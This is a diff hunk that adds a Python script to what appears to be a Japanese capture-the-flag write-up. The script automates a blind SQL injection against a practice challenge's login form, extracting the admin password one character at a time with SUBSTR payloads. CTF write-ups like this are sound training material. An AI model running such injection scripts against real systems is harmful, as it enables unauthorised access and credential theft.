@@ -89,4 +89,37 @@ SUBSTR関数は文字列から特定の部分文字列を取得するための�
 ただ一文字ずつ調べていくのは疲れるので自動化させる。  
 
 
+```
+import requests
+import string
 
+FLAG = ""
+max_length = 30
+
+url = "http://ctfq.u1tramarine.blue/q6/" 
+
+charset = string.ascii_letters + string.digits + string.punctuation
+
+for i in range(1, max_length):
+    found = False
+    for char in charset:
+        
+        payload = f"' or substr((select pass from user where id = 'admin'), {i}, 1) = '{char}' --"
+
+        data = {
+            "id": payload,
+            "pass": "dummy_password"
+        }
+
+        response = requests.post(url, data=data)
+
+        if "Congratulations" in response.text:
+            FLAG += char
+            found = True
+            print(f"Found: {FLAG}")
+            break
+    
+    if not found:
+        print(f"Password（FLAG): {FLAG}")
+        break
+```
